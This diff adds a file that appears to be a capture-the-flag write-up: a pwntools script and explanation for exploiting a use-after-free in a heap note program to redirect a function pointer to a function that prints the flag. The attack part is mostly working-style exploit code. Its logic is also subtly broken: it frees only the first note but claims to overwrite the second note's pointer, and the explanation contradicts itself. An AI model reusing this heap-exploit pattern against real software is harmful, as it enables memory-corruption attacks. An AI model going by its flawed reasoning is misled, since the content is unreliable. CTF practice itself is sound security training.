@@ -1,0 +1,97 @@
+To solve this challenge using `pwntools`, we need to exploit the heap-based vulnerabilities present in the program. The key functions to focus on are `add_note`, `del_note`, and `print_note`. The goal is to overwrite the function pointer in one of the notes to point to the `magic` function, which will execute `system("cat flag")`.
+
+Here are the steps to solve the challenge:
+
+1. **Understand the Vulnerabilities**:
+   - The `add_note` function allows us to create a note with a specified size and content.
+   - The `del_note` function frees the memory allocated for the note's content and the note itself.
+   - The `print_note` function calls the function pointer stored in the note, which is initially set to `print_note_content`.
+
+2. **Exploit Strategy**:
+   - Create two notes.
+   - Delete the first note to free its memory.
+   - Create a new note with a size that can overwrite the function pointer of the second note.
+   - Overwrite the function pointer of the second note to point to the `magic` function.
+   - Print the second note to trigger the `magic` function.
+
+3. **Implement the Exploit**:
+   - Use `pwntools` to interact with the binary.
+   - Send commands to add, delete, and print notes.
+   - Overwrite the function pointer to call `magic`.
+
+Here is the Python code using `pwntools` to solve the challenge:
+
+```python
+from pwn import *
+
+# Connect to the binary
+# Replace 'binary_path' with the path to the binary or use remote connection
+# For local testing
+# p = process('./heap')
+# For remote connection
+p = remote('challenge_server', 1337)
+
+# Addresses
+magic_addr = 0x08048986  # Address of the magic function
+
+# Helper function to add a note
+def add_note(size, content):
+    p.sendline('1')
+    p.recvuntil('Note size :')
+    p.sendline(str(size))
+    p.recvuntil('Content :')
+    p.send(content)
+    p.recvuntil('Success !')
+
+# Helper function to delete a note
+def del_note(index):
+    p.sendline('2')
+    p.recvuntil('Index :')
+    p.sendline(str(index))
+    p.recvuntil('Success')
+
+# Helper function to print a note
+def print_note(index):
+    p.sendline('3')
+    p.recvuntil('Index :')
+    p.sendline(str(index))
+
+# Step 1: Add two notes
+add_note(24, 'A' * 24)
+add_note(24, 'B' * 24)
+
+# Step 2: Delete the first note
+del_note(0)
+
+# Step 3: Add a new note to overwrite the function pointer of the second note
+# The new note will be placed in the freed memory of the first note
+# We need to overwrite the function pointer of the second note with the address of magic
+add_note(8, p32(magic_addr))
+
+# Step 4: Print the second note to trigger the magic function
+print_note(1)
+
+# Receive the flag
+p.interactive()
+```
+
+### Explanation:
+1. **Add Two Notes**:
+   - We create two notes with a size of 24 bytes each. This is to ensure that the notes are large enough to fit the function pointer and some padding.
+
+2. **Delete the First Note**:
+   - We delete the first note to free its memory. This will allow us to allocate a new note in the same memory location.
+
+3. **Overwrite the Function Pointer**:
+   - We create a new note with a size of 8 bytes. This new note will be placed in the freed memory of the first note.
+   - We overwrite the function pointer of the second note with the address of the `magic` function using `p32(magic_addr)`.
+
+4. **Print the Second Note**:
+   - When we print the second note, the function pointer will now point to the `magic` function, which will execute `system("cat flag")` and print the flag.
+
+### Running the Exploit:
+- Save the script to a file, for example, `exploit.py`.
+- Run the script using `python3 exploit.py`.
+- If the binary is running locally, use `process('./heap')` instead of `remote('challenge_server', 1337)`.
+
+This should give you the flag from the challenge.
